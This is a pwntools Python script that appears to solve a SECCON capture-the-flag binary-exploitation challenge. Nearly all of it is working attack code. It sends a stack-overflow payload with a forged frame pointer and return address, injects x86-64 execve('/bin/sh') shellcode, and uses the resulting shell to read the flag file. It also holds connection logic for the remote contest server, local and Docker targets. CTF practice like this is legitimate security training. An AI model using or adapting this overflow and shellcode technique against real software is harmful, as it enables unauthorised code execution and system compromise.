#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"
LIBCNAME = ""

hosts = ("pwn-neko.chal.seccon.jp","localhost","localhost")
ports = (9001,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  global c
  # pop: r13 rdi rsi r14 r15 
  main = 0x4006b7
  pop_rdi = 0x4007e3
  ret = 0x400566
  shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
  got = 0x600bd8

  c.recvline()
  pay = ""
  pay += "A"*0x20
  pay += p64(0x600000+0x40) # rbp

  pay += p64(0x4006bf) #RA

  c.sendline(pay)

  # 2R 
  sleep(1)
  pay = ""
  pay += p64(0x600050) * (0x30//8)
  pay += shellcode
  c.sendline(pay)

  c.sendline("exec 1>&0")
  c.sendline("cat ./flag-e6951df0400add6a6b5be11f25b80cea.txt")


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
